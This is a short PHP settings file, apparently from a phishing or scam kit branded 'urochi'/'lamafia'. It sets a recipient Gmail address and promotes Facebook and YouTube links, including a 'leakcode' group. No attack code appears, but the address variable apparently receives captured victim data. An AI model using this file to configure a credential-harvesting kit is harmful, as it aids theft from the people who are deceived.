<?php 
/* 
               ᴀʟʟ ʀɪɢʜᴛꜱ ʀᴇꜱᴇʀᴠᴇᴅ ʙʏ
                                     ██╗   ██╗██████╗  ██████╗  ██████╗██╗  ██╗██╗𝒯𝑀
                                     ██║   ██║██╔══██╗██╔═══██╗██╔════╝██║  ██║██║
                                     ██║   ██║██████╔╝██║   ██║██║     ███████║██║
                                     ██║   ██║██╔══██╗██║   ██║██║     ██╔══██║██║
                                     ╚██████╔╝██║  ██║╚██████╔╝╚██████╗██║  ██║██║
                                      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝


                                 Powered By [https://www.facebook.com/urochi.was.here/]
                                 Join Us    [https://www.facebook.com/groups/leakcode/]


*/
$yourmail  = 'lamafiadelcc50@gmail.com';

$My_Name = "lamafia" ; 

$Name_page = "lamafia" ;

$channel_youtube = "https://www.youtube.com/channel/UCLnz5ZLUsHccLgXVLa5vv9w";

$My_Facebook = "/facebook.com/urochi.was.here/";

?>